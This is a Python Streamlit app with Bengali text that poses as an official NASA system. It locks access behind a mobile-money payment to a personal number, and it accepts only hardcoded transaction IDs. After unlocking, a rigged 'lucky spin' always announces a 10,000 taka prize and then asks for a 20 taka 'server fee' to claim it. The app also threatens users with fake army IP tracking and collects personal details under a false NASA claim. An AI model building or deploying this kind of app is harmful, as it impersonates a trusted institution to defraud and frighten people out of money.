import streamlit as st
import pandas as pd
from datetime import datetime
import time
import random

# --- ১. অল-ইন-ওয়ান ডিজাইন ও কনফিগারেশন ---
st.set_page_config(page_title="NASA SUPREME MASTER V33", layout="wide")

st.markdown("""
    <style>
    .main { background-color: #000000; }
    .stApp { background: radial-gradient(circle, #001a1a 0%, #000000 100%); color: white; }
    .header-text { 
        color: #00eaff; 
        text-align: center; 
        font-family: 'Orbitron', sans-serif; 
        text-shadow: 0 0 20px #00eaff; 
        padding: 15px; 
    }
    .nasa-logo { 
        display: block; 
        margin: auto; 
        width: 150px; 
        filter: drop-shadow(0 0 10px #00eaff); 
    }
    .lock-screen { 
        text-align: center; 
        padding: 40px; 
        border: 2px solid #00eaff; 
        border-radius: 20px; 
        background: rgba(0, 234, 255, 0.05); 
        box-shadow: 0 0 25px #00eaff; 
        max-width: 800px; 
        margin: auto; 
    }
    .stButton>button { 
        background: linear-gradient(90deg, #00FF00, #008000); 
        color: white; 
        border-radius: 12px; 
        font-weight: bold; 
        width: 100%; 
        height: 3.5em; 
        font-size: 18px;
    }
    .payment-notice { 
        background: rgba(255, 255, 0, 0.1); 
        border: 1px solid yellow; 
        color: yellow; 
        padding: 20px; 
        border-radius: 10px; 
        text-align: center; 
        font-weight: bold;
    }
    </style>
    """, unsafe_allow_html=True)

# --- ২. মাস্টার কন্ট্রোল ও ডাটা সেটিংস ---
OWNER_PASS = "Akash@Owner#2026"  # তোমার অ্যাডমিন পাসওয়ার্ড
AKASH_NUMBER = "01967840830"    # তোমার বিকাশ/নগদ নাম্বার

# এখানে তুমি সেই TrxID গুলো সেভ করবে যেগুলো কাস্টমার টাকা পাঠানোর পর পাবে
VALID_TRX_IDS = ["8M29X7PQ", "9L54KT2R", "AKASH786", "NASA2026", "SUCCESS100"] 

if 'access' not in st.session_state: st.session_state.access = False
if 'payment_logs' not in st.session_state: st.session_state.payment_logs = []
if 'failed_attempts' not in st.session_state: st.session_state.failed_attempts = 0

# --- ৩. নাসা লোগো ও মেইন টাইটেল ---
st.markdown('<img src="https://upload.wikimedia.org/wikipedia/commons/e/e5/NASA_logo.svg" class="nasa-logo">', unsafe_allow_html=True)
st.markdown("<div class='header-text'><h1>🚀 NASA OFFICIAL SUPREME CORE V33</h1><p>MASTER SYSTEM SECURED BY AKASH</p></div>", unsafe_allow_html=True)

# --- ৪. ট্রানজেকশন আইডি লক স্ক্রিন (সবকিছুর গেটওয়ে) ---
if not st.session_state.access:
    st.markdown("<div class='lock-screen'>", unsafe_allow_html=True)
    st.subheader("🔑 সিস্টেমটি আনলক করতে পেমেন্ট ভেরিফাই করুন")
    
    st.markdown(f"""
        <div style='background: rgba(255,255,255,0.1); padding: 20px; border-radius: 15px; margin-bottom: 20px;'>
        <p style='color: #00eaff; font-size: 20px;'>বিকাশ বা নগদ (Personal): <b>{AKASH_NUMBER}</b></p>
        <p style='color: white;'>টাকা পাঠানোর পর আপনার মোবাইলে আসা <b>Transaction ID (TrxID)</b> টি নিচে দিন।</p>
        </div>
    """, unsafe_allow_html=True)
    
    user_trx = st.text_input("এখানে আপনার TrxID কোডটি লিখুন:", placeholder="Ex: 8M29X7PQ").strip()
    
    col1, col2 = st.columns(2)
    with col1:
        if st.button("সিস্টেম আনলক করুন 🔓"):
            if user_trx in VALID_TRX_IDS:
                st.session_state.access = True
                # লগ হিসেবে সেভ করা যাতে তুমি পরে দেখতে পারো
                st.session_state.payment_logs.append({
                    "সময়": datetime.now().strftime("%I:%M:%S %p"),
                    "TrxID": user_trx,
                    "তারিখ": datetime.now().strftime("%d-%m-%Y")
                })
                st.success("✅ পেমেন্ট ভেরিফাইড! আনলক হচ্ছে...")
                time.sleep(1.5)
                st.rerun()
            else:
                st.session_state.failed_attempts += 1
                st.error("❌ ভুল Transaction ID! সঠিক কোড না দিলে ঢুকতে পারবেন না।")
    
    with col2:
        if st.button("সহায়তা/লাইসেন্স 📞"):
            st.info(f"কল করুন: {AKASH_NUMBER}")

    # ৩ বার ভুল করলে সেই আর্মি সিকিউরিটি অ্যালার্ট
    if st.session_state.failed_attempts >= 3:
        st.markdown("<h2 style='color:red; text-align:center;'>🚨 হ্যাকিং ডিটেক্টেড! সেনাবাহিনী আপনার আইপি ট্র্যাক করছে।</h2>", unsafe_allow_html=True)
        st.image("https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNGJqNmU5b3h6eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4JnBvPXYmY3Q9Zw/V4NSRTs3h9XfG/giphy.gif")
    
    st.markdown("</div>", unsafe_allow_html=True)
    st.stop() # পেমেন্ট না দেওয়া পর্যন্ত নিচের কিছু কাজ করবে না

# --- ৫. মূল ড্যাশবোর্ড (পেমেন্ট ভেরিফাই হওয়ার পর) ---
tab1, tab2, tab3 = st.tabs(["🎁 LUCKY SPIN", "📊 USER DATABASE", "🔐 ADMIN CONTROL"])

with tab1:
    st.markdown("### 💎 নাসার বিশেষ লাকি ড্র! (Spin & Win)")
    st.write("আপনি সফলভাবে পেমেন্ট ভেরিফাই করেছেন। এখন আপনার ভাগ্য পরীক্ষা করুন।")
    if st.button("🔥 SPIN NOW - চাকা ঘুরান"):
        with st.spinner("সার্ভার প্রসেসিং হচ্ছে..."):
            time.sleep(1.5)
            st.balloons()
            st.success("🎉 অভিনন্দন! আপনি ১০,০০০ টাকা পুরস্কার জিতেছেন!")
            st.markdown(f"<div class='payment-notice'>পুরস্কারের টাকা ক্লেইম করতে ২০ টাকা সার্ভার ফি পাঠান: {AKASH_NUMBER}<br>টাকা না পাঠালে পুরস্কার বাতিল হবে।</div>", unsafe_allow_html=True)

with tab2:
    st.markdown("### 🏦 NASA ইউজার ডাটা পোর্টাল")
    with st.form("data_form"):
        name = st.text_input("আপনার নাম:")
        msg = st.text_area("আপনার মেসেজ বা নোট:")
        if st.form_submit_button("SUBMIT TO SERVER"):
            st.success("আপনার তথ্য নাসা ডাটাবেজে সংরক্ষিত হয়েছে।")

with tab3:
    st.subheader("🔐 অ্যাডমিন কন্ট্রোল প্যানেল (আকাশের জন্য)")
    admin_input = st.text_input("মাস্টার পাসওয়ার্ড দিন (Owner Only):", type="password")
    
    if admin_input == OWNER_PASS:
        st.write("### ✅ পেমেন্ট করা কাস্টমারদের তালিকা (অডিট লগ):")
        if st.session_state.payment_logs:
            # এই টেবিলটিই তোমার সেই জায়গা যেখানে তুমি সব পেমেন্ট দেখতে পারবে
            df = pd.DataFrame(st.session_state.payment_logs)
            st.table(df)
            
            # ডাটা ডাউনলোড করার অপশন (পেনড্রাইভের জন্য)
            csv = df.to_csv(index=False).encode('utf-8')
            st.download_button("📥 ডাউনলোড রিপোর্ট (CSV)", data=csv, file_name=f"Payments_{datetime.now().date()}.csv")
        else:
            st.info("এখনো কোনো কাস্টমার পেমেন্ট করে ঢোকেনি।")
    elif admin_input != "":
        st.error("🚨 পাসওয়ার্ড ভুল! এই এলাকাটি শুধু আকাশ জান-এর জন্য।")

st.markdown("---")
st.caption(f"© 2026 AKASH NASA AI SUPREME SYSTEM | LAST UPDATE: {datetime.now().date()}")
